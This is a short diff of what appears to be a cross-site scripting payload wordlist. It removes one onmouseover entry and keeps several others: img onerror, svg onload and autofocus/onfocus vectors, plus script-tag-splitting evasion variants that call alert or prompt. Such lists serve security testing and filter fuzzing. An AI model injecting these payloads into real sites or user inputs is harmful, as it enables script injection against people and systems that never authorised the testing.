@@ -2,6 +2,5 @@
 <img src =q onerror=prompt(8)>
 </scrip</script>t><img src =q onerror=prompt(8)>
 <svg onload=alert(1)>
-"onmouseover=alert(1)//
 "autofocus/onfocus=alert(1)//
 </script><svg onload=alert(1)>
